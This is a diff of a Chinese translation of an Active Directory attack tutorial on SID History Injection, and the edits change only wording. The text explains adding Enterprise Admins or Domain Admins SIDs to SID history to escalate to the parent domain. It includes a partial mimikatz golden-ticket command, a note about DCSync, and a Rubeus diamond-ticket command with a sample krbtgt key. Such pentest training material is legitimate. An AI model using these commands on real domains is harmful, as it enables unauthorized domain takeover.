@@ -4,11 +4,11 @@
 
 ## SID 历史注入攻击
 
-**SID 历史注入攻击**的重点是帮助**用户在域之间迁移**，同时确保继续访问前一个域的资源。这是通过**将用户之前的安全标识符 (SID) 纳入其新账户的 SID 历史**来实现的。值得注意的是，这一过程可以被操控，通过将来自父域的高权限组（如企业管理员或域管理员）的 SID 添加到 SID 历史中，从而授予未经授权的访问权限。这种利用方式使得访问父域内的所有资源成为可能。
+**SID 历史注入攻击**的重点是帮助**用户在域之间迁移**，同时确保继续访问前一个域的资源。这是通过**将用户之前的安全标识符 (SID) 纳入其新账户的 SID 历史**来实现的。值得注意的是，这一过程可以被操控，通过将来自父域的高权限组（如企业管理员或域管理员）的 SID 添加到 SID 历史中，从而授予未经授权的访问权限。这种利用方式使得可以访问父域内的所有资源。
 
-执行此攻击有两种方法：通过创建**黄金票证**或**钻石票证**。
+执行此攻击有两种方法：通过创建**金票**或**钻石票**。
 
-要确定**“企业管理员”**组的 SID，首先必须找到根域的 SID。在识别后，可以通过将 `-519` 附加到根域的 SID 来构建企业管理员组的 SID。例如，如果根域 SID 为 `S-1-5-21-280534878-1496970234-700767426`，则“企业管理员”组的结果 SID 将为 `S-1-5-21-280534878-1496970234-700767426-519`。
+要确定**“企业管理员”**组的 SID，首先必须找到根域的 SID。在识别后，可以通过将 `-519` 附加到根域的 SID 来构建企业管理员组的 SID。例如，如果根域 SID 为 `S-1-5-21-280534878-1496970234-700767426`，则“企业管理员”组的 SID 将为 `S-1-5-21-280534878-1496970234-700767426-519`。
 
 您还可以使用**域管理员**组，其 SID 以**512**结尾。
 
@@ -33,13 +33,13 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-有关黄金票证的更多信息，请查看：
+有关 golden tickets 的更多信息，请查看：
 
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
-### 钻石票证 (Rubeus + KRBTGT-AES256)
+### Diamond Ticket (Rubeus + KRBTGT-AES256)
 ```powershell
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
